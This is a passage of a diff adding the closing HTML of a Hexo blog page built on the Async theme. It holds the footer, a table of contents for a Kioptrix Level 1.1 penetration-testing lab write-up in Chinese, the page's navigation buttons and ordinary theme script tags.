+            <span class="footer-separator" data-separator=" | "></span>
+            <span> 
+                主题 - 
+                <a rel="noopener" href='https://github.com/MaLuns/hexo-theme-async' target='_blank'>Async</a>
+                v2.1.10
+            </span>
+        </div>
+      
+
+     
+
+     
+</footer>
+                    <!-- footer end -->
+
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+            <!-- body end -->
+
+            
+
+    <div id="post-toc" class="trm-post-toc">
+      <div class="trm-post-toc-header">
+        目录导航
+				<span id="post-toc-top">
+					置顶
+				</span>
+      </div>
+      <div class="trm-post-toc-content">
+        <ol class="trm-toc"><li class="trm-toc-item trm-toc-level-1" title="Kioptrix Level 1.1(#2)"><a rel="nofollow" class="trm-toc-link" href="#Kioptrix-Level-1-1-2"><span class="trm-toc-number">1.</span> <span class="trm-toc-text">Kioptrix Level 1.1(#2)</span></a><ol class="trm-toc-child"><li class="trm-toc-item trm-toc-level-2" title="渗透思路"><a rel="nofollow" class="trm-toc-link" href="#渗透思路"><span class="trm-toc-number">1.1.</span> <span class="trm-toc-text">渗透思路</span></a><ol class="trm-toc-child"><li class="trm-toc-item trm-toc-level-3" title="信息收集"><a rel="nofollow" class="trm-toc-link" href="#信息收集"><span class="trm-toc-number">1.1.1.</span> <span class="trm-toc-text">信息收集</span></a></li><li class="trm-toc-item trm-toc-level-3" title="web渗透"><a rel="nofollow" class="trm-toc-link" href="#web渗透"><span class="trm-toc-number">1.1.2.</span> <span class="trm-toc-text">web渗透</span></a></li><li class="trm-toc-item trm-toc-level-3" title="Linux 提权  Linux Privilege Escalation"><a rel="nofollow" class="trm-toc-link" href="#Linux-提权-Linux-Privilege-Escalation"><span class="trm-toc-number">1.1.3.</span> <span class="trm-toc-text">Linux 提权  Linux Privilege Escalation</span></a></li></ol></li><li class="trm-toc-item trm-toc-level-2" title="学习总结"><a rel="nofollow" class="trm-toc-link" href="#学习总结"><span class="trm-toc-number">1.2.</span> <span class="trm-toc-text">学习总结</span></a><ol class="trm-toc-child"><li class="trm-toc-item trm-toc-level-3" title="关于631端口 ipp服务 CUPS 1.1"><a rel="nofollow" class="trm-toc-link" href="#关于631端口-ipp服务-CUPS-1-1"><span class="trm-toc-number">1.2.1.</span> <span class="trm-toc-text">关于631端口 ipp服务 CUPS 1.1</span></a></li><li class="trm-toc-item trm-toc-level-3" title="关于渗透方向"><a rel="nofollow" class="trm-toc-link" href="#关于渗透方向"><span class="trm-toc-number">1.2.2.</span> <span class="trm-toc-text">关于渗透方向</span></a></li><li class="trm-toc-item trm-toc-level-3" title="关于 Linux 提权"><a rel="nofollow" class="trm-toc-link" href="#关于-Linux-提权"><span class="trm-toc-number">1.2.3.</span> <span class="trm-toc-text">关于 Linux 提权</span></a></li><li class="trm-toc-item trm-toc-level-3" title="关于主机间传文件 via http"><a rel="nofollow" class="trm-toc-link" href="#关于主机间传文件-via-http"><span class="trm-toc-number">1.2.4.</span> <span class="trm-toc-text">关于主机间传文件 via http</span></a></li><li class="trm-toc-item trm-toc-level-3" title="关于web渗透sql注入"><a rel="nofollow" class="trm-toc-link" href="#关于web渗透sql注入"><span class="trm-toc-number">1.2.5.</span> <span class="trm-toc-text">关于web渗透sql注入</span></a></li></ol></li></ol></li></ol>
+      </div>
+    </div>
+
+            
+<div class="trm-fixed-container">
+    
+        <div class="trm-fixed-btn post-toc-btn" data-title="目录">
+            <i class="iconfont fas fa-th-list"></i>
+        </div>
+    
+    
+        <div class="trm-fixed-btn" data-title="阅读模式" onclick="asyncFun.switchReadMode()">
+            <i class="iconfont fas fa-book-reader"></i>
+        </div>
+    
+    
+        <div class="trm-fixed-btn hidden-md" data-title="单栏和双栏切换" onclick="asyncFun.switchSingleColumn()">
+            <i class="iconfont fas fa-arrows-alt-h"></i>
+        </div>
+    
+    <div id="trm-back-top" class="trm-fixed-btn" data-title="回到顶部">
+        <i class="iconfont fas fa-arrow-up"></i>
+    </div>
+</div>
+        </div>
+      </div>
+      <!-- scroll container end -->
+  </div>
+  <!-- app wrapper end -->
+
+  
+  <!-- Plugin -->
+
+
+
+
+    
+    
+<script src="https://npm.elemecdn.com/@fancyapps/ui@4.0/dist/fancybox.umd.js"></script>
+
+    
+<script src="https://npm.elemecdn.com/swiper@4.5.1/dist/js/swiper.min.js"></script>
+
+
+    
+        <script src="/js/plugins/typing.js?v=2.1.10"></script>
+    
+
+    
+
+    <!-- 数学公式 -->
+    
+
+    <!-- 评论插件 -->
+    
+        
+
+        
+    
+
+
+
+<!-- CDN -->
+
+
+    
+
+    
+
+    
+
+
+
+
+    <!-- Service Worker -->
+    
+    <!-- baidu push -->
+    
+
+
+<script id="async-script" src="/js/main.js?v=2.1.10"></script>
+
+</body>
+
+</html>
